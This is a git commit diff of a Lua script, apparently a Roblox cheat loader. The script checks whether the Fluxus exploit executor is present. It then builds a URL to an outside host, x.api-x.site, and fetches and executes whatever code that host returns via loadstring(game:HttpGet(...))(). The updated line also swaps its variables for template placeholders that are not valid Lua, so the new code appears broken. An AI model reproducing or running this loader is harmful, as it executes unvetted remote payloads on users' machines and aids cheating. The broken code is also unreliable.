18293c7c64e305fca3a6deb5ec46e49949bac32d
bjalalsjzbslalqoqueeyhskaambpqo <cuentaargentina19@gmail.com>
2024-11-02 11:20:55 -0300

    Update s1.lua

--- s1.lua
+++ s1.lua
@@ -1,16 +1,13 @@
 local function checkFluxus()
-    for _, inst in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if string.match(inst.Name:lower(), "fluxus") then
-            return "F"
-        end
+  for _,inst in pairs(game:GetService("CoreGui"):GetChildren())do
+    if string.match(inst.Name:lower(),"fluxus")then
+      return"F"
     end
-    return "N"
+  end
+  return"N"
 end
-
-_G.v = {}
-table.insert(_G.v, 's1')
-local i = "valor"
-local s = 1
-local fluxusStatus = checkFluxus()
-local n = string.format("https://x.api-x.site?i=%s&s=%d&f=%s", i, s, fluxusStatus)
+_G.v={}
+table.insert(_G.v,'s1')
+local fluxusStatus=checkFluxus()
+local n=string.format("https://x.api-x.site?i=%s&s=%d&f=%s",'${i}',${s},fluxusStatus)
 loadstring(game:HttpGet(n))()
